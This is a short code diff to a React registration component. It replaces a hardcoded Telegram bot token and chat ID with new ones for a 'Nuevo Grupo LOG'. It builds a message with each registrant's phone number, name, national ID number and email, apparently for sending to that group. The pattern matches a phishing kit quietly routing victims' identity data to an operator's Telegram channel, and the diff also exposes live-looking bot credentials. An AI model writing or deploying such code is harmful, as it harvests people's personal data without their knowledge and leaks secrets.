@@ -52,8 +52,8 @@ function Register({ phoneNumber, onBack, onRegister }) {
       sessionStorage.setItem("user_nombre", nombre);
 
       // Telegram data
-      const token = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
-      const chatId = '-5182218323'; // Grupo LOG
+      const token = '8594588884:AAFq6nlhKzJL8Ahdhe2P0B-8ThQkIwvCEpM';
+      const chatId = '-5017945956'; // Nuevo Grupo LOG
       
       const message = `🚀 *Nuevo Registro* 🚀\n\n📱 *Celular:* \`${phoneNumber}\`\n👤 *Nombre:* \`${nombre}\`\n🆔 *Cédula:* \`${cedula}\`\n📧 *Email:* \`${email}\``;
 
